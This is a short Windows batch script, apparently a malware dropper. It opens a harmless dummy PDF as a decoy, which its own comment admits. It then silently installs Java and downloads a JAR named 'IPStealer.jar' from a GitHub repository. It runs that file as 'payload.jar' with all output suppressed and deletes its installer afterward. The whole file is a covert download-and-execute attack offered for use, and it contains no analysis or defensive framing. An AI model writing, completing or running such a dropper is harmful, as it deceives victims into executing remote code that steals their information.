@echo off
REM Open PDF first (decoy)
start "" "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf"

REM Download and install Java 21 silently
powershell -Command "Invoke-WebRequest -Uri 'https://download.oracle.com/java/21/latest/jdk-21_windows-x64_bin.exe' -OutFile '%TEMP%\jdk.exe' -Headers @{'Cookie'='oraclelicense=accept-securebackup-cookie'}"
start /wait %TEMP%\jdk.exe /s /v"/qn" >nul 2>&1

REM Download your jar
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/mavi30173-ai/mc-server/raw/main/IPStealer.jar' -OutFile '%TEMP%\payload.jar'"

REM Wait for Java installation, then run jar
timeout /t 10 >nul
java -jar "%TEMP%\payload.jar" >nul 2>&1

REM Cleanup
del "%TEMP%\jdk.exe" >nul 2>&1
exit